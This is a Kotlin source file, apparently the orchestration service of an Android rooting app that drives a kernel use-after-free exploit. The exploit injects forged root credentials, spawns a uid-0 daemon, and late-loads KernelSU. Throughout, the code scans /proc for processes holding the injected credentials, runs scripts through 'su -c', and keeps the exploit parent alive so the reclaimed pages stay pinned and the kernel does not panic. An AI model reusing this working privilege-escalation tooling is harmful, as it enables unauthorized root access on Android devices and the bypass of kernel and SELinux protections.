        return runCatching {
            File("/proc").listFiles()
                ?.mapNotNull { it.name.toIntOrNull() }
                .orEmpty()
                .filter { it != self }
                .filter { pid ->
                    val cmdline = runCatching {
                        File("/proc/$pid/cmdline").readBytes().toString(Charsets.UTF_8)
                    }.getOrNull() ?: return@filter false
                    cmdline.contains("ksud") &&
                        !cmdline.contains("ksu_takeover.sh") &&
                        !cmdline.contains("libcve98260") &&
                        !cmdline.contains("cve98260-app/ksud.log")
                }
        }.getOrDefault(emptyList())
    }

    /**
     * 扫出所有落在 unlabeled 域的进程 pid —— 这些进程持有的都是注入的伪造 cred。
     *
     * 范围不限于 ksud：rootd、cred 子进程、以及 rootd fork 出的任何 uid=0 命令
     * 都算。父进程释放被 UAF 回收的页之前，必须确认这个集合为空。
     *
     * 判据即 SELinux 上下文落在 unlabeled 域（与正规 cred 的自有域如 u:r:ksu:s0 相区分）。
     */
    private fun unlabeledDomainPidsDirect(): List<Int> {
        val self = Process.myPid()
        return runCatching {
            File("/proc").listFiles()
                ?.mapNotNull { it.name.toIntOrNull() }
                .orEmpty()
                .filter { it != self }
                .filter { pid ->
                    val ctx = runCatching {
                        File("/proc/$pid/attr/current").readText().trim()
                    }.getOrNull()
                    ctx != null && ctx.contains("unlabeled")
                }
        }.getOrDefault(emptyList())
    }

    /**
     * 用 KSU 的 su（uid 0）扫 unlabeled 域进程 —— **权威判据**，返回 null 表示扫描不可用。
     *
     * 为什么必须用 root 扫：宿主进程跑在 shell(2000) 域，读 /proc/<uid0>/attr/current
     * 可能被 SELinux 拒绝。旧的直接扫描把"读不到"静默丢掉（getOrNull + null 过滤），
     * 于是会出现「procs on borrowed cred => none」而 cred 子进程其实还活着的假阴性
     * ——真机 21:45 日志已复现：`[cred] waiting for child 24230 (alive=1) 25 s`
     * 与 `procs on borrowed cred => none` 同时出现。
     *
     * 假阴性的代价是放行退场 → 释放被 UAF 回收的页 → kernel panic，
     * 所以只要 root 通道可用，就必须走这条路径，不能退回 shell 扫描。
     *
     * 用 SCAN_DONE 标记区分「扫完确实为空」与「su 根本没跑起来」：只有看到标记才认结果。
     */
    private fun unlabeledDomainPidsViaRoot(
        workDir: File,
        env: Map<String, String>,
    ): List<Int>? = runCatching {
        val script = File(workDir, "scan-unlabeled.sh")
        script.writeText(
            """
            for d in /proc/[0-9]*; do
              c=${'$'}(cat ${'$'}d/attr/current 2>/dev/null) || continue
              case "${'$'}c" in
                *unlabeled*) echo "U ${'$'}{d#/proc/}" ;;
              esac
            done
            echo SCAN_DONE
            """.trimIndent() + "\n",
        )
        script.setReadable(true, false)
        val out = runCapture(
            listOf("/system/bin/sh", "-c", "su -c 'sh ${script.absolutePath}'"),
            workDir, env, VERIFY_TIMEOUT_SEC,
        )
        if (!out.contains("SCAN_DONE")) {
            null
        } else {
            out.lineSequence()
                .map { it.trim() }
                .filter { it.startsWith("U ") }
                .mapNotNull { it.removePrefix("U ").trim().toIntOrNull() }
                .distinct()
                .toList()
        }
    }.getOrNull()


    /**
     * su 探测 —— **shell 通道**（本 UserService 的身份，uid 2000）。
     *
     * KernelSU 的 su 不是 PATH 里的文件：内核在 execve 阶段把 su 替换成 ksud
     * （上游 v3.3.1 userspace/ksud/src/cli.rs:501 —— "the kernel executes su with
     * argv[0] = 'su' and replace it with us"），而且**只对已授权的 uid 替换**；
     * 未授权时 execve 返回 ENOENT，shell 就报 "su: inaccessible or not found"。
     *
     * 授权按 uid 管理，所以这条通道只有两种情况能拿到 su：
     *   · 模块带 allow_shell=1 加载（上游 late_load.rs 的 --allow-shell 参数）；
     *   · 管理器里把 uid 2000 也授了权（少见）。
     *
     * 2026-10-31 真机教训：只用这条通道探测，KSU 明明在工作也永远得到
     * "su: inaccessible or not found" —— 因为用户在管理器里授权的是 App 的 uid。
     */
    private fun suProbe(workDir: File, env: Map<String, String>): String =
        runCatching {
            runCapture(
                listOf("/system/bin/sh", "-c", "su -c id"),
                workDir, env, VERIFY_TIMEOUT_SEC,
            )
        }.getOrDefault("").trim()

    /**
     * su 探测 —— **App 通道**（App 自身 uid）。
     *
     * 回调到 App 进程里试：KernelSU 的 superuser 授权是按 uid 管的，用户在
     * 管理器里授权的是本 App 的 uid，**只有这条通道吃得到那条授权**。
     *
     * 走 Binder 同步调用：App 进程是唯一持有该 uid 的进程。带超时，避免 App
     * 进程无响应时把 KSU 阶段挂死。
     */
    private fun suProbeAppUid(callback: ICve98260Callback?): String {
        if (callback == null) return ""
        return runCatching {
            val pool = Executors.newSingleThreadExecutor()
            try {
                pool.submit<String> { callback.probeSu() }
                    .get(SU_APP_PROBE_TIMEOUT_MS, TimeUnit.MILLISECONDS)
            } finally {
                pool.shutdownNow()
            }
        }.getOrDefault("").trim()
    }

    /** 本 App 的 uid（KSU 的授权就是按它匹配的）。取不到返回 -1。 */
    private fun appUid(): Int = runCatching {
        context.packageManager.getApplicationInfo(context.packageName, 0).uid
    }.getOrDefault(-1)

    /**
     * 判据：要么拿到 uid=0(root)，要么上下文落在 KSU 自己的域。
     * KSU 的 su 在某些版本上只回 context 不回 uid，两者取其一即可。
     */
    private fun suWorks(probe: String): Boolean =
        probe.contains("uid=0(root)") || probe.contains("context=u:r:ksu:s0")

    private fun suWorks(workDir: File, env: Map<String, String>): Boolean =
        suWorks(suProbe(workDir, env))

    /**
     * 判据：KernelSU 是否已经是活跃的 root 提供方（方法二 · 2026-10-28）。
     *
     * 通过 `su -c id` 同时拿到 `uid=0(root)` 与 KSU 自己的 SELinux 域
     * (`context=u:r:ksu:s0`) 来确认：root 由内核模块正规授予，而非本进程的临时
     * rootd 通道（unlabeled 域）。用于在「上一轮残留进程」护栏前做短路——既然内核
     * 已稳定提供 root，就不必再对已被钉住的页二次注入（会徒增 panic 风险）。
     *
     * 与 safeRelease 的 independentRoot 判据保持一致（两者皆需 uid + ksu 域）。
     */
    private fun ksuRootLive(
        workDir: File,
        env: Map<String, String>,
        callback: ICve98260Callback?,
    ): Boolean {
        val probe = suProbe(workDir, env)
        if (probe.contains("uid=0(root)") && probe.contains("context=u:r:ksu:s0")) return true
        // App 通道也算：用户在 KSU 管理器里授权的是 App 的 uid，shell 通道
        // （uid 2000）看不到那条授权 —— 只探 shell 会把「已经可用」误判成「不可用」。
        val appProbe = suProbeAppUid(callback)
        return appProbe.contains("uid=0(root)") && appProbe.contains("context=u:r:ksu:s0")
    }

    /** 取 JavaProcess 的 pid：API 33+ 有 Process.pid()，更低版本走实现类私有字段。 */
    private fun processPid(proc: JavaProcess): Int? = runCatching {
        proc.javaClass.getMethod("pid").invoke(proc) as? Int
    }.recoverCatching {
        proc.javaClass.getDeclaredField("pid")
            .apply { isAccessible = true }
            .get(proc) as? Int
    }.getOrNull()

    /**
     * 汇报 late-load 装出来的 userspace 组件。
     *
     * 关键事实（上游 KernelSU v3.3.1 userspace/ksud/src/late_load.rs:82）：
     * late-load 内部会调 `utils::install()`，把 ksud 装到 `/data/adb/ksud` 并建
     * `/data/adb/ksu/bin/ksud` 软链 —— 而这正是**内核在 execve 时替换 su 用的
     * 那个二进制**（cli.rs:501）。
     *
     * 所以旧实现「宿主再 `nohup ksud &` 起一个 daemon」是多余的，而且用的是
     * 管理器里那个陈旧构建（只认 -h/-V），必然起不来 —— 这正是
     * "ksud daemon not visible in /proc; ksud said: Options: -h, --help" 的来源。
     * KernelSU 也没有 Magisk 那种常驻 daemon：late-load 自带的后台进程跑完
     * stage 脚本、重启管理器之后就退出了。
     *
     * /data/adb 是 0700 root，shell 身份读不到，所以由接管脚本（rootd, uid 0）
     * 把结果写进日志，这里只解析。
     */
    private fun reportKsudInstall(workDir: File, callback: ICve98260Callback?) {
        val text = runCatching { File(workDir, "ksu_takeover.log").readText() }.getOrDefault("")
        val installed = Regex("\\[ksu\\] ksud_installed=(\\S+)")
            .findAll(text).map { it.groupValues[1] }.toList()
        val used = Regex("\\[ksu\\] ksud_used=(\\S*)").find(text)?.groupValues?.get(1)
        if (!used.isNullOrBlank()) {
            callback?.onLog("<s> takeover used ksud: $used")
        }
        if (installed.isNotEmpty()) {
            callback?.onLog(
                "<b> ksud userspace installed: ${installed.joinToString(", ")}" +
                    " (this is what the kernel substitutes for 'su')",
            )
        } else {
            callback?.onLog(
                "<s> warn: ksud userspace component not reported by the takeover script" +
                    " (/data/adb/ksu/bin/ksud, /data/adb/ksud); su replacement target missing",
            )
        }
    }

    /**
     * best-effort 把 exploit 父进程的 oom_score_adj 调到 -1000。
     *
     * 父进程持有被占住的页面；一旦被 LMK 或厂商冻结机制回收，页面释放而
     * ksud 仍引用悬空 cred，数分钟后就会 panic（自动重启）。
     *
     * 注入的 cred 只改了 uid/gid、没有提升 capabilities，所以这里很可能被
     * EACCES 拒绝——只回读并记录，绝不影响主链路。
     */
    private fun recordOomScoreAdj(pid: Int?, callback: ICve98260Callback?) {
        if (pid == null) {
            callback?.onLog("<s> oom_score_adj: pid unknown, skipped")
            return
        }
        val f = File("/proc/$pid/oom_score_adj")
        val ok = runCatching { f.writeText("-1000") }.isSuccess
        val now = runCatching { f.readText().trim() }.getOrDefault("?")
        callback?.onLog(
            "<s> oom_score_adj(pid=$pid): write=" + (if (ok) "ok" else "denied") + ", now=$now",
        )
    }


    private fun readResult(workDir: File, name: String): String? {
        val f = File(workDir, name)
        if (!f.isFile) return null
        val v = runCatching { f.readText().trim() }.getOrNull() ?: return null
        return v.takeIf { HEX_RE.matches(it) }
    }

    /**
     * 只删 socket / stop 文件，**绝不对任何进程发信号**。
     *
     * 历史教训（真机 22:11 一轮，设备关机）：这里原来会扫 cmdline 含
     * libcve98260.so 的进程并 sendSignal(9)。注释当时写的是"对 uid 0 本身就是
     * EPERM，保留无害" —— 但上一轮的**父进程是 uid 2000**，与本服务同 uid，
     * SIGKILL 完全成功。而父进程正是钉住那批被 UAF 回收的页的进程：杀掉它，
     * 页被提前释放，仍持有伪造 cred 的进程（cred 子进程、经 rootd 拉起的 ksud）
     * 随后踩到悬空指针 → kernel panic → 设备重启。
     *
     * 残留进程现在由 runChain 的 [4] 前置检查处理：发现残留直接中止并提示重启。
     *
     * 返回删除失败的个数。此前用 `runCatching { delete() }` 吞掉了一切失败，于是
     * 日志里 "cleaning up stale sockets" 永远成立；真机 22:50 实测工作目录里积了
     * 14 个 `root-*.sock`，全都没被删掉 —— SELinux Enforcing 下 shell 域 unlink 一个
     * unlabeled socket 会被拒绝。删除失败本身无害（每轮 socket 名唯一，不会串轮），
     * 但日志不得谎报，故把失败数交给调用方上报。
     */
    private fun cleanupStale(workDir: File): Int {
        val targets = mutableListOf(File(ROOT_SOCK), File(workDir, "rootd.stop"))
        tryQuietly {
            workDir.listFiles()
                ?.filter {
                    it.name.startsWith("root-") &&
                        (it.name.endsWith(".sock") || it.name.endsWith(".stop"))
                }
                ?.let { targets.addAll(it) }
        }
        var failed = 0
        for (f in targets) {
            if (!runCatching { f.delete() }.getOrDefault(false)) failed++
        }
        return failed
    }

    /** 参考实现 run.py 的 wait_idle：runnable <= 10 才注入。 */
    private fun waitIdle() {
        val deadline = System.currentTimeMillis() + 24_000
        while (System.currentTimeMillis() < deadline) {
            val txt = runCatching { File("/proc/loadavg").readText() }.getOrNull() ?: return
            val fields = txt.trim().split(Regex("\\s+"))
            val runnable = fields.getOrNull(3)
                ?.let { Regex("(\\d+)/(\\d+)").find(it) }
                ?.groupValues?.get(1)?.toIntOrNull()
            if (runnable != null && runnable <= 10) return
            Thread.sleep(3000)
        }
    }

    private fun waitForRootd(logFile: File, timeoutMs: Long): Boolean {
        val deadline = System.currentTimeMillis() + timeoutMs
        var lastLen = -1L
        var exitedAt = 0L
        while (System.currentTimeMillis() < deadline) {
            /*
             * 日志文件没变长就不重扫。tailContains 每次要读 4 MB 尾巴
             * （TAIL_SCAN_MAX），400 ms 一轮、300 s 超时 = 几百 MB 的重复 IO，
             * 白烧在 Shizuku 服务进程上。
             */
            val len = logFile.length()
            if (len != lastLen) {
                lastLen = len
                if (tailContains(logFile, ROOTD_MARKER)) return true
                /* 原生体自己放弃：立刻返回，别空等满 300 s。 */
                if (tailContains(logFile, FAILED_MARKER)) return false
                if (tailContains(logFile, "cred escalation not effective") ||
                    tailContains(logFile, "binding failed") ||
                    tailContains(logFile, "listen failed")
                ) {
                    return false
                }
            }
            /*
             * 原生体进程退出**不能**立刻当成失败。
             *
             * 宿主是用 --daemon-exit 启动它的：**成功路径里主进程本来就会正常
             * 退出**（rootd 是 cred child 的孙进程，还在跑）。rootd 写就绪
             * 标记与主进程退出是并行的两条线，中间有几十毫秒的窗口 ——
             * 一见进程退出就判失败，会把「已经提权成功」误报成失败。
             *
             * 所以：进程退出后进入宽限期，期间继续等 rootd 标记；宽限期过了
             * 还没有标记，才认定原生体真的崩了。
             */
            val proc = exploitProcess
            if (proc != null && !proc.isAlive) {
                if (exitedAt == 0L) {
                    exitedAt = System.currentTimeMillis()
                } else if (System.currentTimeMillis() - exitedAt > EXIT_GRACE_MS) {
                    return false
                }
            } else {
                exitedAt = 0L
            }
            Thread.sleep(400)
        }
        return false
    }

    private fun tailContains(file: File, needle: String): Boolean {
        val len = file.length()
        if (len <= 0L) return false
        val from = (len - TAIL_SCAN_MAX).coerceAtLeast(0L)
        val n = (len - from).toInt()
        val buf = ByteArray(n)
        runCatching {
            RandomAccessFile(file, "r").use { h ->
                h.seek(from)
                var got = 0
                while (got < n) {
                    val r = h.read(buf, got, n - got)
                    if (r <= 0) break
                    got += r
                }
            }
        }.getOrElse { return false }
        return String(buf, Charsets.UTF_8).contains(needle)
    }

    private fun modulesHasKernelsu(): Boolean =
        runCatching {
            File("/proc/modules").readText().contains("kernelsu", ignoreCase = true)
        }.getOrDefault(false)

    /**
     * ksud 解析（v1.0.9 起）三级链：
     *
     *  1. PackageManager 扫描（主路径，认 libksud.so 文件不认包名——自编译 fork
     *     包名不可预知）：nativeLibraryDir 直拷，版本跟管理器走；
     *  2. KSUD_STAGE shell 脚本（回退）：pm path 逐候选包名 + unzip；
     *  3. APK 内置 assets/ksu/ksud（最后兜底，KMI 集冻结在打包时刻）。
     *
     * 任意外部来源 ksud 经 CVE98260_KSUD 传给原生 find_ksud（第一优先候选）。
     * 不动原生 C：ksu.c 大小校验只打日志、不拦截。
     */
    private fun resolveKsud(workDir: File, callback: ICve98260Callback?): File? {
        //
        // 候选优先级（v2.2.0 修正）：**优先用设备管理器自带的 ksud**，内置
        // assets/ksu/ksud（stock KernelSU 3.3.1）退居其后作自动兜底。
        //   · 接管 late-load 装进内核的是「这个 ksud 里内嵌的模块」；要装成与
        //     设备上已装管理器**同源**的模块，管理器才认得出提权状态、并在未授权
        //     uid execve su 时弹授权框。SukiSU Ultra / KernelSU Next 等 fork 与
        //     stock KernelSU 的 superkey/模块 ABI 不兼容——旧实现固定首选内置
        //     stock 模块，导致「SukiSU 不识别 root、也不弹窗」（此前那两项诉求）。
        //   · 内置 ksud 仍被解压到 workDir/ksud，作为原生 find_ksud 候选阶梯的
        //     原生 find_ksud 候选阶梯第 2 位：万一某个管理器里是只认 -h/-V 的陈旧 ksud（2026-10-31 真机教训：
        //     「模块加载了但没有 su」），late-load 空转后会自动回落到内置那个。
        //
        // 多管理器：装了多个时优先取用户经 setManagerPackage 选定的包名。
        //
        val bundled = extractKsud(workDir)
        if (bundled != null) {
            callback?.onLog(
                "<s> bundled ksud ready: ${bundled.absolutePath} (size=${bundled.length()})",
            )
        }
        var staged: File? = null
        val pm = context.packageManager
        val scanned = runCatching {
            val sel = selectedManager
            if (!sel.isNullOrBlank())
                KsudStage.scanManagerLibFor(pm, sel) ?: KsudStage.scanManagerLib(pm)
            else
                KsudStage.scanManagerLib(pm)
        }.getOrNull()
        if (scanned != null) {
            val (lib, pkg) = scanned
            staged = runCatching {
                val target = File(KsudStage.TARGET)
                lib.copyTo(target, overwrite = true)
                target.setExecutable(true, false)
                target
            }.getOrNull()
            if (staged != null && staged.length() > 0L) {
                callback?.onLog(
                    "<s> manager ksud staged as primary candidate [$pkg]: ${staged.absolutePath} " +
                        "(size=${staged.length()})",
                )
            } else {
                callback?.onLog("<s> warn: manager lib found [$pkg] but staging failed; trying script")
            }
        } else {
            callback?.onLog("<s> no manager with ksud found via PackageManager (incl. obfuscated forks); trying script")
        }

        /*
         * 只有 **PM 真的落盘了** 才跳过 shell 脚本。
         *
         * 之前用的是 `scanned != null`（PM 扫到了文件）—— 但拷到
         * KsudStage.TARGET 那一步可能失败（目录不可写、权限被拒、拷贝中断）。
         * 那种情况下 staged 仍是 null，而脚本那一路是**唯一的救生索**：
         * 跳过它就只剩内置 ksud（KMI 集冻结在打包时刻），装进去的模块与设备上
         * 已装管理器不同源 → 管理器不认这个 root、也不弹授权框 → 「提权失败」。
         *
         * 所以判据必须是 staged != null（文件确实落到磁盘上）。
         */
        val scriptOutcome: KsudStage.Outcome? = if (staged != null) {
            null
        } else {
            runCatching {
                val out = File(workDir, "ksud_stage.out").apply { delete() }
                val pb = ProcessBuilder("/system/bin/sh", "-c", KsudStage.SCRIPT)
                    .redirectErrorStream(true)
                    .redirectOutput(ProcessBuilder.Redirect.appendTo(out))
                val p = pb.start()
                if (!p.waitFor(20, TimeUnit.SECONDS)) {
                    Log.w(TAG, "ksud stage timed out; falling back to bundled ksud")
                    callback?.onLog("<s> warn: ksud stage timeout, using bundled ksud")
                    return@runCatching null
                }
                KsudStage.parse(runCatching { out.readText() }.getOrDefault(""))
            }.getOrNull()
        }

        if (staged != null) {
            callback?.onLog("<s> skip ksud shell stage: PackageManager scan already located ksud")
        } else {
            if (scanned != null) {
                callback?.onLog(
                    "<s> warn: manager ksud found but not staged; falling back to shell stage",
                )
            }
            when (scriptOutcome) {
                is KsudStage.Outcome.Ok -> {
                    val f = File(KsudStage.TARGET)
                    if (f.isFile && f.length() > 0L) {
                        f.setExecutable(true, false)
                        staged = f
                        callback?.onLog(
                            "<s> ksud staged via script: md5=${scriptOutcome.md5} size=${scriptOutcome.size}",
                        )
                    } else {
                        callback?.onLog("<s> warn: ksud stage reported ok but file missing; using bundled")
                    }
                }
                is KsudStage.Outcome.Fail ->
                    callback?.onLog("<s> warn: ksud stage fail (${scriptOutcome.reason}); using bundled ksud")
                null -> callback?.onLog("<s> warn: ksud stage error; using bundled ksud")
            }
        }

        // 优先返回设备管理器的 ksud（让加载的模块与已装管理器同源），
        // 内置 stock-KSU ksud 作自动兜底（原生 find_ksud 仍把它列为第 2 候选）。
        return staged ?: bundled
    }

    /** 从 assets/ksu/ksud 解压可执行文件；不存在返回 null。 */
    private fun extractKsud(workDir: File): File? {
        return runCatching {
            val target = File(workDir, "ksud")
            if (!target.exists() || target.length() == 0L) {
                context.assets.open("ksu/ksud").use { input ->
                    target.outputStream().use { output -> input.copyTo(output) }
                }
            }
            target.setExecutable(true, false)
            if (target.length() > 0L) target else null
        }.getOrNull()
    }

    /**
     * 载入机型配置（`assets/device_profiles/<product>-<device>.conf`）。
     *
     * 找不到就是 null —— 机型配置是**加速层**，没有它照样能跑（退回全量运行时扫描）。
     * 回退顺序：`<product>-<device>.conf` → `<product>.conf`。
     */
    private fun loadDeviceProfile(): DeviceProfile? {
        val product = Build.PRODUCT?.trim().orEmpty()
        val device = Build.DEVICE?.trim().orEmpty()
        if (product.isEmpty() || device.isEmpty()) return null
        for (id in listOf("$product-$device", product)) {
            val text = runCatching {
                context.assets.open("device_profiles/$id.conf").use { input ->
                    input.readBytes().toString(Charsets.UTF_8)
                }
            }.getOrNull() ?: continue
            val profile = DeviceProfile.parse(id, text)
            if (profile != null) return profile
        }
        return null
    }

    /**
     * 运行时页大小（拿不到返回 null）。
     *
     * 4K / 16K / 64K 页的 PAGE_OFFSET 不同，机型配置里的 page_offset 只在
     * 页大小对得上时才可信 —— 这是「注入成功但偏移全错」的隐性故障点。
     */
    private fun runtimePageSize(): Int? = runCatching {
        android.system.Os.sysconf(android.system.OsConstants._SC_PAGESIZE).toInt()
    }.getOrNull()


    /**
     * 日志文件 tailer：把原生 stdout 逐行回传，状态行转 onProgress。
     * 按字节缓冲 + 整行 UTF-8 解码（原生日志含中文，逐字节转 Char 会乱码）。
     */
    private fun relayLog(logFile: File, callback: ICve98260Callback?) {
        var offset = 0L
        val carry = ByteArrayOutputStream()
        val buf = ByteArray(16384)

        fun emitLine(raw: ByteArray) {
            val line = String(raw, Charsets.UTF_8)
            if (line.isEmpty()) return
            if (line.startsWith(STATUS_MARKER)) {
                val parts = line.removePrefix(STATUS_MARKER).trim().split(' ')
                if (parts.size >= 2) callback?.onProgress(stageIndex(parts[0]), parts[1])
            } else {
                callback?.onLog(line)
            }
        }

        while (!Thread.currentThread().isInterrupted) {
            try {
                if (logFile.isFile) {
                    RandomAccessFile(logFile, "r").use { h ->
                        val len = h.length()
                        if (offset > len) {
                            offset = 0L
                            carry.reset()
                        }
                        if (len > offset) {
                            h.seek(offset)
                            var remaining = len - offset
                            while (remaining > 0) {
                                val want = minOf(buf.size.toLong(), remaining).toInt()
                                val n = h.read(buf, 0, want)
                                if (n <= 0) break
                                offset += n
                                remaining -= n
                                var start = 0
                                for (i in 0 until n) {
                                    if (buf[i] == '\n'.code.toByte()) {
                                        carry.write(buf, start, i - start)
                                        emitLine(carry.toByteArray())
                                        carry.reset()
                                        start = i + 1
                                    }
                                }
                                if (start < n) carry.write(buf, start, n - start)
                            }
                        }
                    }
                }
                Thread.sleep(120)
            } catch (_: InterruptedException) {
                Thread.currentThread().interrupt()
                return
            } catch (_: Exception) {
                tryQuietly { Thread.sleep(150) }
            }
        }
    }


    override fun setManagerPackage(pkg: String?) {
        selectedManager = pkg?.trim()?.takeIf { it.isNotEmpty() }
        Log.i(TAG, "selected manager package: ${selectedManager ?: "<auto>"}")
    }

    override fun getKernelRelease(): String =
        runCatching { System.getProperty("os.version") ?: "unknown" }.getOrDefault("unknown")

    override fun isShizukuReady(): Boolean = PrivilegeGate.checkService().ok

    override fun destroy() {
        if (!running.get()) {
            /*
             * ⚠️ 这里**绝不能**对 exploit 父进程发信号（Process.destroy() = SIGTERM）。
             *
             * 父进程正是钉住那批被 UAF 回收的页的进程：杀掉它 → 页被提前释放 →
             * 仍持有伪造 cred 的 cred 子进程 / 经 rootd 拉起的 ksud 随后踩到悬空
             * 指针 → kernel panic → 设备重启。真机 2026-10-31 22:11 已经因此关机
             * 过一次；当时只把 socket 清理路径改成「绝不对任何进程发信号」，
             * destroy() 这条漏网了。
             *
             * 口径与 teardown 一致（见「native process stays resident ... leaving it
             * alive is safer than freeing the borrowed cred」）：留在原地比释放
             * 借来的 cred 安全。残留进程由 runChain 的 [4] 前置检查处理 ——
             * 发现残留直接中止并提示重启。
             */
            kotlin.system.exitProcess(0)
        }
    }
}
